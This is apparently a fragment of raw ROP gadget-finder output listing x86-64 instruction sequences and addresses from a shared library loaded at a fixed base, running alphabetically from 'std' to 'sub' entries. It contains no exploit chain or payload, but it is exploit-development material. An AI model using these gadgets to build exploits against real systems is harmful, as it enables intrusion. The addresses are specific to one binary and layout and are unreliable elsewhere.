0x00002aaaaac693b2 : std ; jmp qword ptr [rdx]
0x00002aaaaac69446 : std ; jmp qword ptr [rsi]
0x00002aaaaac693d6 : std ; jmp rcx
0x00002aaaaac79182 : std ; jmp rsp
0x00002aaaaac694ce : std ; lcall ptr [rbp - 0x2e00024b] ; mov bh, 0xfd ; call rcx
0x00002aaaaac6954e : std ; lcall ptr [rsi - 0x49] ; std ; call rcx
0x00002aaaaac6960e : std ; ljmp ptr [rax] ; fdivr st(3) ; push rax ; fsincos ; call rax
0x00002aaaaab738cb : std ; mov r12, rsi ; sub rsp, 8 ; call 0x8ab7a
0x00002aaaaac273cb : std ; mov word ptr [rdi - 2], cx ; ret
0x00002aaaaabc86af : std ; outsd dx, dword ptr [rsi] ; cmc ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaac695ce : std ; push qword ptr [rax] ; mov bh, 0xfd ; call rcx
0x00002aaaaac6952e : std ; push qword ptr [rcx - 0x4a] ; std ; call rcx
0x00002aaaaab1ca2b : std ; push qword ptr [rcx] ; shr bl, cl ; stosb byte ptr [rdi], al ; mov eax, 0xffffffff ; ret
0x00002aaaaac693ae : std ; push qword ptr [rsi - 0x60] ; std ; jmp qword ptr [rdx]
0x00002aaaaac5d5c0 : std ; push rax ; hlt ; inc dword ptr [rdi] ; push rcx ; hlt ; call qword ptr [rcx]
0x00002aaaaac5d6e4 : std ; push rbx ; hlt ; inc dword ptr [rdi] ; push rsp ; hlt ; call qword ptr [rcx]
0x00002aaaaac6951e : std ; push rcx ; mov ch, 0xfd ; call rcx
0x00002aaaaac6953e : std ; push rcx ; mov dh, 0xfd ; call rcx
0x00002aaaaabf001f : std ; ret
0x00002aaaaab83029 : std ; setne dl ; jmp 0xae03b
0x00002aaaaab8594a : std ; setne dl ; jmp 0xb095b
0x00002aaaaab88101 : std ; setne dl ; jmp 0xb311b
0x00002aaaaab26341 : std ; xor byte ptr [rdi], cl ; xchg eax, esp ; ret
0x00002aaaaabd79f0 : std ; xor edx, edx ; xor esi, esi ; mov rbx, rax ; call rax
0x00002aaaaab2f6d8 : sti ; add al, byte ptr [rcx - 0x77] ; ret 0x144
0x00002aaaaab3fd1f : sti ; add dword ptr [rax], eax ; add rsp, 0x1000 ; pop rbx ; ret
0x00002aaaaac41281 : sti ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7cb7fec8], al ; fdivr st(7) ; ret
0x00002aaaaac6962a : sti ; call qword ptr [rax + 0x20fffbe5]
0x00002aaaaac69972 : sti ; call qword ptr [rax - 0x1f00040c]
0x00002aaaaac6991e : sti ; call qword ptr [rax - 0x1f000413]
0x00002aaaaac697a6 : sti ; call qword ptr [rax - 0x1f000438]
0x00002aaaaac69752 : sti ; call qword ptr [rax - 0x1f00043f]
0x00002aaaaac6930e : sti ; call qword ptr [rax - 0x1f0004a4]
0x00002aaaaac69796 : sti ; call qword ptr [rax - 0x3d]
0x00002aaaaac69222 : sti ; call qword ptr [rax]
0x00002aaaaac6931e : sti ; call rax
0x00002aaaaac8a3da : sti ; call rcx
0x00002aaaaac8a8aa : sti ; call rsi
0x00002aaaaac6fc9a : sti ; call rsp
0x00002aaaaac6998e : sti ; dec dword ptr [rax + 0x28] ; cld ; call qword ptr [rax]
0x00002aaaaab92ebe : sti ; dec dword ptr [rax + 0x39] ; ret
0x00002aaaaaba2310 : sti ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaab42cdb : sti ; dec dword ptr [rax - 0x7b] ; sal byte ptr [rbx + rdi*2 + 0x48], 0x89 ; ret
0x00002aaaaab44616 : sti ; dec dword ptr [rax - 0x7b] ; sal byte ptr [rbx + rdx*2 + 0x48], 0x89 ; ret
0x00002aaaaab5413e : sti ; dec dword ptr [rax - 0x7d] ; ret 0x4007
0x00002aaaaab42361 : sti ; dec dword ptr [rcx + 0x415d5be8] ; pop rsp ; ret
0x00002aaaaac60a0e : sti ; dec eax ; add ebx, edi ; call rax
0x00002aaaaac6bcf1 : sti ; in eax, dx ; push qword ptr [rcx + rcx*8 - 0x3ec0000] ; in eax, dx ; call rsp
0x00002aaaaac692a6 : sti ; inc dword ptr [rax + 0x28] ; sti ; jmp rax
0x00002aaaaac692c6 : sti ; inc dword ptr [rax + 0x35] ; sti ; call qword ptr [rax]
0x00002aaaaac692ce : sti ; inc dword ptr [rax + 0x3a] ; sti ; jmp qword ptr [rax]
0x00002aaaaac696ae : sti ; inc dword ptr [rax + 0x40fffbd7] ; fsincos ; jmp qword ptr [rax]
0x00002aaaaac6921e : sti ; inc dword ptr [rax + 3] ; sti ; call qword ptr [rax]
0x00002aaaaac6991a : sti ; inc dword ptr [rax - 0x14] ; sti ; call qword ptr [rax - 0x1f000413]
0x00002aaaaac6994e : sti ; inc dword ptr [rax - 0x19] ; sti ; call qword ptr [rax]
0x00002aaaaac6967e : sti ; inc dword ptr [rax - 0x21] ; sti ; jmp qword ptr [rax]
0x00002aaaaac696b2 : sti ; inc dword ptr [rax - 0x27] ; sti ; jmp qword ptr [rax]
0x00002aaaaac696ce : sti ; inc dword ptr [rax - 0x29] ; sti ; inc dword ptr [rax] ; fsincos ; jmp rax
0x00002aaaaac6997e : sti ; inc dword ptr [rax - 0x2f000408] ; stc ; sti ; jmp qword ptr [rax]
0x00002aaaaac6992a : sti ; inc dword ptr [rax - 0x2f00040f] ; sti ; jmp qword ptr [rax]
0x00002aaaaac697a2 : sti ; inc dword ptr [rax - 0x39] ; sti ; call qword ptr [rax - 0x1f000438]
0x00002aaaaac6996e : sti ; inc dword ptr [rax - 0xd] ; sti ; call qword ptr [rax - 0x1f00040c]
0x00002aaaaac698f2 : sti ; inc dword ptr [rax] ; cld ; call qword ptr [rax]
0x00002aaaaac6994a : sti ; inc dword ptr [rax] ; cld ; sti ; inc dword ptr [rax - 0x19] ; sti ; call qword ptr [rax]
0x00002aaaaac696d2 : sti ; inc dword ptr [rax] ; fsincos ; jmp rax
0x00002aaaaac69792 : sti ; inc dword ptr [rax] ; ret 0xfffb
0x00002aaaaac6927e : sti ; inc dword ptr [rax] ; sbb ebx, edi ; push rax ; sbb ebx, edi ; jmp rax
0x00002aaaaac692d6 : sti ; inc dword ptr [rax] ; sti ; call rax
0x00002aaaaac6993a : sti ; inc eax ; idiv bl ; call qword ptr [rax]
0x00002aaaaac697c2 : sti ; inc eax ; sar ebx, 1 ; call qword ptr [rax]
0x00002aaaaac6932a : sti ; inc eax ; sti ; call qword ptr [rax]
0x00002aaaaac5e918 : sti ; inc ebx ; add dh, bh ; jmp rdi
0x00002aaaaac69352 : sti ; jmp qword ptr [rax + 0x20fffb74]
0x00002aaaaac6935a : sti ; jmp qword ptr [rax + 0x20fffb77]
0x00002aaaaac69362 : sti ; jmp qword ptr [rax + 0x20fffb7a]
0x00002aaaaac6936a : sti ; jmp qword ptr [rax + 0x20fffb7d]
0x00002aaaaac69372 : sti ; jmp qword ptr [rax + 0x20fffb80]
0x00002aaaaac6937a : sti ; jmp qword ptr [rax + 0x20fffb83]
0x00002aaaaac69382 : sti ; jmp qword ptr [rax + 0x20fffb86]
0x00002aaaaac692c2 : sti ; jmp qword ptr [rax + 0x40fffb33]
0x00002aaaaac69236 : sti ; jmp qword ptr [rax]
0x00002aaaaac8f3aa : sti ; jmp qword ptr [rdx]
0x00002aaaaaba2e78 : sti ; jmp qword ptr [rsi + 0xf]
0x00002aaaaac60a16 : sti ; jmp rax
0x00002aaaaabab3ab : sti ; lcall ptr [rbx + 0x31] ; rcr byte ptr [rbp + 0x41], 0x5c ; ret
0x00002aaaaac277a8 : sti ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac48ca9 : sti ; mov ebx, 0x1f0fffea ; add bl, dh ; ret
0x00002aaaaac277a2 : sti ; mov ecx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 5], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaab72dad : sti ; mov rax, rdi ; ret
0x00002aaaaabbd029 : sti ; or byte ptr [rcx - 0x9ce8c28], cl ; ret
0x00002aaaaabf13fa : sti ; or dword ptr [rdi], ecx ; ret
0x00002aaaaab02b91 : sti ; or eax, 0xf8834800 ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaac6c6c9 : sti ; out dx, eax ; call rsp
0x00002aaaaac69326 : sti ; push qword ptr [rax + 0x64] ; sti ; inc eax ; sti ; call qword ptr [rax]
0x00002aaaaac6921a : sti ; push qword ptr [rax + 2] ; sti ; inc dword ptr [rax + 3] ; sti ; call qword ptr [rax]
0x00002aaaaac697be : sti ; push qword ptr [rax - 0x30] ; sti ; inc eax ; sar ebx, 1 ; call qword ptr [rax]
0x00002aaaaac69936 : sti ; push qword ptr [rax - 0xb] ; sti ; inc eax ; idiv bl ; call qword ptr [rax]
0x00002aaaaac6998a : sti ; push qword ptr [rax - 4] ; sti ; dec dword ptr [rax + 0x28] ; cld ; call qword ptr [rax]
0x00002aaaaac6971a : sti ; push qword ptr [rax] ; fdiv st(3), st(0) ; jmp qword ptr [rax]
0x00002aaaaac6978e : sti ; push qword ptr [rax] ; mov edi, 0xc200fffb ; sti ; call qword ptr [rax - 0x3d]
0x00002aaaaac692ee : sti ; push qword ptr [rax] ; sti ; call qword ptr [rax]
0x00002aaaaac69612 : sti ; push rax ; fsincos ; call rax
0x00002aaaaac69282 : sti ; push rax ; sbb ebx, edi ; jmp rax
0x00002aaaaac692f6 : sti ; push rax ; sti ; call rax
0x00002aaaaac5824a : sti ; ret
0x00002aaaaab0bb79 : sti ; ret 0x38
0x00002aaaaab17316 : sti ; ret 0xffbf
0x00002aaaaac5d49c : sti ; retf ; jmp qword ptr [rdi]
0x00002aaaaac6f3c9 : sti ; stc ; jmp rsp
0x00002aaaaac69989 : sti ; sti ; push qword ptr [rax - 4] ; sti ; dec dword ptr [rax + 0x28] ; cld ; call qword ptr [rax]
0x00002aaaaabfc02d : sti ; sub al, 0xf ; xchg eax, ebp ; ret 0xfb80
0x00002aaaaab01377 : sti ; test rax, rax ; je 0x2c385 ; call rax
0x00002aaaaab84a0f : sti ; xor byte ptr [rax - 0x77], cl ; call 0x4ccd8f2e
0x00002aaaaab89eb7 : sti ; xor byte ptr [rax - 0x77], cl ; call 0x4ccde3d6
0x00002aaaaabd6c40 : sti ; xor esi, esi ; mov r12d, edx ; mov rbp, rax ; call rax
0x00002aaaaaad7314 : stosb byte ptr [rdi], al ; add al, 0xaa ; ret
0x00002aaaaab62d42 : stosb byte ptr [rdi], al ; add al, byte ptr [rax] ; add byte ptr [rax + 1], cl ; clc ; add rax, rcx ; ret
0x00002aaaaabc448c : stosb byte ptr [rdi], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x00002aaaaabf7a32 : stosb byte ptr [rdi], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaac6b8dd : stosb byte ptr [rdi], al ; add byte ptr [rax], al ; je 0x196945 ; in eax, dx ; jmp rsp
0x00002aaaaaaf5ffa : stosb byte ptr [rdi], al ; call 0x53ec100a
0x00002aaaaac6a639 : stosb byte ptr [rdi], al ; cld ; call qword ptr [rdx + 0x22fffca9]
0x00002aaaaac6a5b5 : stosb byte ptr [rdi], al ; cld ; call qword ptr [rsi]
0x00002aaaaac6a775 : stosb byte ptr [rdi], al ; cld ; call rax
0x00002aaaaac6a771 : stosb byte ptr [rdi], al ; cld ; inc dword ptr [rax - 0x56] ; cld ; call rax
0x00002aaaaac6a635 : stosb byte ptr [rdi], al ; cld ; inc dword ptr [rdx] ; stosb byte ptr [rdi], al ; cld ; call qword ptr [rdx + 0x22fffca9]
0x00002aaaaac6a579 : stosb byte ptr [rdi], al ; cld ; inc eax ; test eax, 0xa950fffc ; cld ; jmp rax
0x00002aaaaac6a6f5 : stosb byte ptr [rdi], al ; cld ; jmp rsp
0x00002aaaaac58724 : stosb byte ptr [rdi], al ; cli ; ret 0xac65
0x00002aaaaac5cf35 : stosb byte ptr [rdi], al ; jmp qword ptr [rdi]
0x00002aaaaab1ca30 : stosb byte ptr [rdi], al ; mov eax, 0xffffffff ; ret
0x00002aaaaac46f09 : stosb byte ptr [rdi], al ; mov rax, rsi ; sub rax, rdx ; vzeroupper ; ret
0x00002aaaaaad7317 : stosb byte ptr [rdi], al ; ret
0x00002aaaaaad866e : stosb byte ptr [rdi], al ; stc ; insb byte ptr [rdi], dx ; mov ebx, 0x952a6c41 ; ret
0x00002aaaaac18882 : stosb byte ptr [rdi], al ; sub byte ptr [rax], r8b ; test eax, eax ; jne 0x14389a ; xor eax, eax ; ret
0x00002aaaaabe8f82 : stosb byte ptr [rdi], al ; sub r8d, dword ptr [r8] ; test eax, eax ; jne 0x113f9a ; xor eax, eax ; ret
0x00002aaaaabe9282 : stosb byte ptr [rdi], al ; sub r8d, dword ptr [rax] ; test eax, eax ; jne 0x11429a ; xor eax, eax ; ret
0x00002aaaaac7ab25 : stosd dword ptr [rdi], eax ; add byte ptr [rax], al ; test al, 0x73 ; out dx, al ; jmp qword ptr [rdx]
0x00002aaaaac6a56d : stosd dword ptr [rdi], eax ; cld ; call qword ptr [rax]
0x00002aaaaac6a769 : stosd dword ptr [rdi], eax ; cld ; jmp qword ptr [rax]
0x00002aaaaac6a62d : stosd dword ptr [rdi], eax ; cld ; jmp rdx
0x00002aaaaac6a76d : stosd dword ptr [rdi], eax ; cld ; push qword ptr [rax + 0x40fffcaa] ; stosb byte ptr [rdi], al ; cld ; call rax
0x00002aaaaabf823a : stosd dword ptr [rdi], eax ; mov eax, r8d ; ret
0x00002aaaaabcf2f9 : stosd dword ptr [rdi], eax ; push rbp ; push qword ptr [rcx] ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x00002aaaaac5d664 : stosd dword ptr [rdi], eax ; push rdx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaab0af9c : stosd dword ptr [rdi], eax ; ret
0x00002aaaaac0d2d4 : stosd dword ptr [rdi], eax ; sub byte ptr [rax], al ; cmp dword ptr fs:[rax], 0x18 ; je 0x1382e9 ; ret
0x00002aaaaabf8239 : stosq qword ptr [rdi], rax ; mov eax, r8d ; ret
0x00002aaaaab0af9b : stosq qword ptr [rdi], rax ; ret
0x00002aaaaab5e1df : str word ptr [rdi + 0x63] ; or al, 0x8a ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x00002aaaaac59c11 : sub ah, ah ; mov bh, 6 ; movsd dword ptr [rdi], dword ptr [rsi] ; int1 ; ret 0x5803
0x00002aaaaac69991 : sub ah, bh ; call qword ptr [rax]
0x00002aaaaac699b1 : sub ah, bh ; inc dword ptr [rax] ; sub bh, ah ; jmp rax
0x00002aaaaac69ab5 : sub ah, bh ; jmp qword ptr [rax]
0x00002aaaaac699d1 : sub ah, bh ; jmp rax
0x00002aaaaabd284a : sub al, 0 ; add byte ptr [rax], al ; add byte ptr [rax], al ; add rsp, 8 ; ret
0x00002aaaaaaf6973 : sub al, 0 ; add byte ptr [rax], al ; call 0x2dc46
0x00002aaaaac74f10 : sub al, 0 ; add byte ptr [rax], al ; fmul qword ptr [rdi] ; add byte ptr [rax + 0x5f], cl ; jmp 0x19ff26
0x00002aaaaac72fe8 : sub al, 0 ; add byte ptr [rax], al ; mov ah, 0x30 ; add byte ptr [rax], al ; ret 0xffe9
0x00002aaaaac7f680 : sub al, 0 ; add byte ptr [rax], al ; test qword ptr [rax], -0xdd3b800 ; jmp rcx
0x00002aaaaabd5d9c : sub al, 0 ; add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabd63d3 : sub al, 0 ; add rsp, 0x18 ; ret
0x00002aaaaabd23af : sub al, 0 ; add rsp, 8 ; ret
0x00002aaaaabd3857 : sub al, 0 ; call 0xfe67a
0x00002aaaaabd58b6 : sub al, 0 ; je 0x1008cb ; mov dword ptr [rip + 0x2c2950], edi ; ret
0x00002aaaaabd4be0 : sub al, 0 ; jne 0xffbf8 ; jmp 0xffc12
0x00002aaaaabd4bdf : sub al, 0 ; jne 0xffbf9 ; jmp 0xffc13
0x00002aaaaabd273b : sub al, 0 ; lea rax, qword ptr [rip + 0x2c8854] ; ret
0x00002aaaaabd257b : sub al, 0 ; lea rax, qword ptr [rip + 0x2c8a14] ; ret
0x00002aaaaabd3747 : sub al, 0 ; mov byte ptr [r8 - 1], 0 ; ret
0x00002aaaaabd1715 : sub al, 0 ; mov dword ptr fs:[rax], 0x16 ; mov eax, edi ; ret
0x00002aaaaabd69f5 : sub al, 0 ; mov dword ptr fs:[rax], 0x16 ; ret
0x00002aaaaabcfb15 : sub al, 0 ; mov dword ptr fs:[rax], 0x16 ; xor eax, eax ; ret
0x00002aaaaac0c0f9 : sub al, 0 ; mov eax, 1 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabd1261 : sub al, 0 ; mov qword ptr [rax], -1 ; xor eax, eax ; ret
0x00002aaaaabd2909 : sub al, 0 ; mov rdx, rax ; jmp 0xfd8a3
0x00002aaaaabc9ed4 : sub al, 0 ; neg eax ; mov dword ptr fs:[rcx], eax ; or rax, 0xffffffffffffffff ; ret
0x00002aaaaabd637f : sub al, 0 ; pop rbp ; pop r12 ; ret
0x00002aaaaabd3ce6 : sub al, 0 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaabd39cc : sub al, 0 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabd6349 : sub al, 0 ; pop rcx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabd2582 : sub al, 0 ; ret
0x00002aaaaac81164 : sub al, 0x12 ; add dword ptr [rax], eax ; fcomp st(1) ; call qword ptr [rsi]
0x00002aaaaabd09a5 : sub al, 0x24 ; mov eax, r8d ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaac72964 : sub al, 0x2a ; add byte ptr [rax], al ; pop rax ; mov cl, ch ; jmp qword ptr [rsi]
0x00002aaaaab55ecb : sub al, 0x34 ; add dh, dh ; ret 0xf02
0x00002aaaaab80052 : sub al, 0x3b ; sub al, 0x75 ; pop rax ; ret
0x00002aaaaac83c64 : sub al, 0x3d ; add dword ptr [rax], eax ; sbb al, 0xf5 ; call qword ptr [rdx]
0x00002aaaaabaafec : sub al, 0x44 ; mov dword ptr [rdi + 0x30], eax ; ret
0x00002aaaaac444a0 : sub al, 0x50 ; add al, byte ptr [rax] ; movsxd rcx, dword ptr [r11 + rdx*4] ; add rcx, r11 ; jmp rcx
0x00002aaaaac5d634 : sub al, 0x52 ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac75764 : sub al, 0x58 ; add byte ptr [rax], al ; sbb dl, cl ; in al, dx ; jmp rax
0x00002aaaaac5e044 : sub al, 0x66 ; cmc ; dec dword ptr [rsi] ; cmc ; push rsp ; cmc ; call rsp
0x00002aaaaab80055 : sub al, 0x75 ; pop rax ; ret
0x00002aaaaababee9 : sub al, 0x83 ; ret 0x4801
0x00002aaaaab90149 : sub al, 0x85 ; ror byte ptr [rdi], 0x94 ; ret 0x3840
0x00002aaaaac6a810 : sub al, 0x9d ; cld ; call rdx
0x00002aaaaac6a808 : sub al, 0x9e ; cld ; lcall ptr [rbp + rbx*4 - 0x62d30004] ; cld ; call rdx
0x00002aaaaac43413 : sub al, 0xa ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaac7dd64 : sub al, 0xde ; add byte ptr [rax], al ; sbb byte ptr [rbp - 0xf], bl ; jmp qword ptr [rcx]
0x00002aaaaab71f16 : sub al, 0xf ; mov dh, 0x45 ; ret
0x00002aaaaab6ffd2 : sub al, 0xf ; mov dh, 0x55 ; ret
0x00002aaaaabfc02e : sub al, 0xf ; xchg eax, ebp ; ret 0xfb80
0x00002aaaaac7f689 : sub al, 0xf2 ; jmp rcx
0x00002aaaaac6f599 : sub al, 0xfa ; inc dword ptr [rax + rdi + 0x2ef40002] ; cli ; jmp rsp
0x00002aaaaac69a9d : sub al, 0xfc ; inc dword ptr [rax + 0x2e] ; cld ; call qword ptr [rax]
0x00002aaaaabd5f7f : sub al, 0xff ; xor byte ptr [rdi], cl ; lahf ; ret 0xe883
0x00002aaaaac82c0d : sub al, 1 ; add byte ptr [rax], ah ; fcomi st(4) ; call qword ptr [rbx]
0x00002aaaaab823de : sub al, 1 ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaac70064 : sub al, 1 ; add byte ptr [rax], al ; call 0x111998cc
0x00002aaaaac6cbdd : sub al, 1 ; add byte ptr [rdx + rdx*2], dl ; call rsp
0x00002aaaaac6f3dd : sub al, 2 ; add byte ptr [rbx + rax - 6], al ; call rsp
0x00002aaaaac26936 : sub al, 4 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac90464 : sub al, 5 ; add al, byte ptr [rax] ; cwde ; outsd dx, dword ptr [rsi] ; clc ; call rcx
0x00002aaaaab6a14f : sub al, bl ; nop dword ptr [rax] ; ret
0x00002aaaaac69610 : sub al, bl ; sti ; push rax ; fsincos ; call rax
0x00002aaaaac26b24 : sub al, byte ptr [rax + rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac729bd : sub al, byte ptr [rax] ; add al, al ; mov ebp, ecx ; jmp rsp
0x00002aaaaac72995 : sub al, byte ptr [rax] ; add al, bh ; mov cl, ch ; jmp rsp
0x00002aaaaab08ea2 : sub al, byte ptr [rax] ; add byte ptr [rax], al ; mov rax, rcx ; ret
0x00002aaaaac01926 : sub al, byte ptr [rax] ; add byte ptr [rcx + rcx*4 - 9], cl ; mov rcx, qword ptr [rsp + 8] ; call rcx
0x00002aaaaabedae5 : sub al, byte ptr [rax] ; add rax, qword ptr fs:[0] ; ret
0x00002aaaaabf4aa3 : sub al, byte ptr [rax] ; add rsp, 8 ; ret
0x00002aaaaabf42c6 : sub al, byte ptr [rax] ; call rax
0x00002aaaaabf0080 : sub al, byte ptr [rax] ; jne 0x11b097 ; jmp 0x11b0b1
0x00002aaaaabf00d8 : sub al, byte ptr [rax] ; jne 0x11b0f1 ; jmp 0x11b10b
0x00002aaaaabf53e5 : sub al, byte ptr [rax] ; ret
0x00002aaaaabfc74e : sub al, byte ptr [rax] ; test eax, eax ; je 0x12775e ; ret
0x00002aaaaab316b9 : sub al, byte ptr [rbx - 0x5f743] ; call qword ptr [rax]
0x00002aaaaab214e5 : sub al, byte ptr [rdx] ; add byte ptr [rax + 0x39], cl ; ret
0x00002aaaaab86207 : sub al, ch ; ret
0x00002aaaaab08635 : sub al, ch ; ret 0xfffe
0x00002aaaaac5be3d : sub al, dh ; jmp qword ptr [rax + 0x29]
0x00002aaaaab2f7b4 : sub bh, 0xff ; dec dword ptr [rcx + 0x39] ; ret
0x00002aaaaac699b5 : sub bh, ah ; jmp rax
0x00002aaaaac69995 : sub bh, ah ; push rax ; sub edi, esp ; call rax
0x00002aaaaab4706c : sub bh, bh ; loopne 0x72009 ; mov eax, 0xffffffff ; ret
0x00002aaaaab5c8d0 : sub bh, bl ; xor eax, dword ptr [rax] ; add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbp ; pop r12 ; ret
0x00002aaaaac7e6f8 : sub bh, ch ; int1 ; jmp rcx
0x00002aaaaac5d458 : sub bl, ah ; jmp qword ptr [rdi]
0x00002aaaaac692a9 : sub bl, bh ; jmp rax
0x00002aaaaac69d48 : sub bl, byte ptr [rsp + rdi*8 - 1] ; mov edx, 0x60fffc5b ; pop rbx ; cld ; call rax
0x00002aaaaac692a8 : sub bl, dil ; jmp rax
0x00002aaaaab80046 : sub byte ptr [r11], r15b ; sub byte ptr [rbp + 0x63], r14b ; ret
0x00002aaaaab4bb95 : sub byte ptr [r8 + 0x63], r9b ; ror byte ptr [rax + 1], cl ; ret 0x8944
0x00002aaaaab491de : sub byte ptr [r8 + 1], r9b ; ret 0x8949
0x00002aaaaac105a1 : sub byte ptr [r8 + r15*4], r8b ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaac17187 : sub byte ptr [r8 - 0x77], r9b ; ret 0xc148
0x00002aaaaac187c3 : sub byte ptr [r8], r8b ; test eax, eax ; jne 0x1437d9 ; xor eax, eax ; ret
0x00002aaaaac187f3 : sub byte ptr [r8], r8b ; test eax, eax ; jne 0x143809 ; xor eax, eax ; ret
0x00002aaaaac18823 : sub byte ptr [r8], r8b ; test eax, eax ; jne 0x143839 ; xor eax, eax ; ret
0x00002aaaaac0880e : sub byte ptr [r9 - 0x39], cl ; xor byte ptr [r8], r8b ; add byte ptr [rax], al ; add al, ch ; ret
0x00002aaaaac102d1 : sub byte ptr [r9], r15b ; sal dword ptr [rbx + 9], 1 ; xor eax, eax ; ret
0x00002aaaaabca057 : sub byte ptr [rax + 0x63], cl ; ret 0xc283
0x00002aaaaab4bb96 : sub byte ptr [rax + 0x63], cl ; ror byte ptr [rax + 1], cl ; ret 0x8944
0x00002aaaaabf5af4 : sub byte ptr [rax + 0xf], cl ; ret 0x8949
0x00002aaaaabaa089 : sub byte ptr [rax + 1], bh ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac09d2e : sub byte ptr [rax + 1], bh ; ret
0x00002aaaaab491df : sub byte ptr [rax + 1], cl ; ret 0x8949
0x00002aaaaabdcea7 : sub byte ptr [rax + 3], cl ; push rdi ; and byte ptr [rax - 0x73], cl ; adc byte ptr [rax + 0x39], r9b ; ret 0x1b72
0x00002aaaaac105a2 : sub byte ptr [rax + rdi*4], al ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaab36cd0 : sub byte ptr [rax - 0x39], cl ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x30e8
0x00002aaaaab3fc82 : sub byte ptr [rax - 0x73], cl ; add eax, 0x35aa76 ; pop rbx ; pop rbp ; ret
0x00002aaaaaafa10c : sub byte ptr [rax - 0x75], cl ; jl 0x25140 ; and byte ptr [rax - 0x75], cl ; and al, 0x30 ; call rax
0x00002aaaaaafcbfa : sub byte ptr [rax - 0x75], cl ; jl 0x27c2e ; and byte ptr [rax - 0x75], cl ; and al, 0x30 ; call rax
0x00002aaaaab5c7c4 : sub byte ptr [rax - 0x76b70007], al ; ret
0x00002aaaaab59404 : sub byte ptr [rax - 0x77], cl ; out dx, eax ; call rax
0x00002aaaaac06998 : sub byte ptr [rax - 0x77], cl ; out dx, eax ; mov rcx, qword ptr [rsp + 0x20] ; call rcx
0x00002aaaaab47bd7 : sub byte ptr [rax - 0x77], cl ; push rax ; sbb byte ptr [rcx + 0x5bc0310b], cl ; ret
0x00002aaaaab07a2f : sub byte ptr [rax - 0x77], cl ; ret
0x00002aaaaabce271 : sub byte ptr [rax - 0x77], cl ; ret 0x830f
0x00002aaaaab5db15 : sub byte ptr [rax - 0x77], cl ; ret 0x8948
0x00002aaaaabcd337 : sub byte ptr [rax - 0x77], cl ; ret 0x8d49
0x00002aaaaab48f35 : sub byte ptr [rax - 0x77], cl ; ret 0x9e9
0x00002aaaaab4220c : sub byte ptr [rax - 0x77], cl ; ret 0xc148
0x00002aaaaab463f8 : sub byte ptr [rax - 0x78], al ; cmp al, byte ptr [rax + 0xf] ; mov dh, 0xc7 ; ret
0x00002aaaaabb71e4 : sub byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x94 ; ret 0x2fe9
0x00002aaaaabc33b0 : sub byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaac84f18 : sub byte ptr [rax - 0xb], dh ; jmp qword ptr [rcx]
0x00002aaaaaad72e1 : sub byte ptr [rax], 0x10 ; salc ; ret
0x00002aaaaac17930 : sub byte ptr [rax], 1 ; add byte ptr [rax], al ; jmp rax
0x00002aaaaaaffca4 : sub byte ptr [rax], al ; add byte ptr [rax], al ; add al, ch ; ret 0xea
0x00002aaaaac72805 : sub byte ptr [rax], al ; add byte ptr [rax], bl ; xchg cl, ch ; jmp qword ptr [rcx]
0x00002aaaaac0c705 : sub byte ptr [rax], al ; add rsp, 8 ; ret
0x00002aaaaac14d25 : sub byte ptr [rax], al ; call qword ptr [rax]
0x00002aaaaac0d2d5 : sub byte ptr [rax], al ; cmp dword ptr fs:[rax], 0x18 ; je 0x1382e8 ; ret
0x00002aaaaac15a2c : sub byte ptr [rax], al ; mov eax, 1 ; add rsp, 8 ; ret
0x00002aaaaac14ab8 : sub byte ptr [rax], al ; neg eax ; mov dword ptr fs:[rcx], eax ; or rax, 0xffffffffffffffff ; ret
0x00002aaaaac152de : sub byte ptr [rax], al ; ret
0x00002aaaaac12184 : sub byte ptr [rax], al ; test eax, eax ; je 0x13d198 ; xor eax, eax ; ret
0x00002aaaaac152b8 : sub byte ptr [rax], al ; test eax, eax ; jne 0x1402d1 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaac187c4 : sub byte ptr [rax], al ; test eax, eax ; jne 0x1437d8 ; xor eax, eax ; ret
0x00002aaaaac187f4 : sub byte ptr [rax], al ; test eax, eax ; jne 0x143808 ; xor eax, eax ; ret
0x00002aaaaac18824 : sub byte ptr [rax], al ; test eax, eax ; jne 0x143838 ; xor eax, eax ; ret
0x00002aaaaac18854 : sub byte ptr [rax], al ; test eax, eax ; jne 0x143868 ; xor eax, eax ; ret
0x00002aaaaac18884 : sub byte ptr [rax], al ; test eax, eax ; jne 0x143898 ; xor eax, eax ; ret
0x00002aaaaac188b4 : sub byte ptr [rax], al ; test eax, eax ; jne 0x1438c8 ; xor eax, eax ; ret
0x00002aaaaaad72e2 : sub byte ptr [rax], dl ; salc ; ret
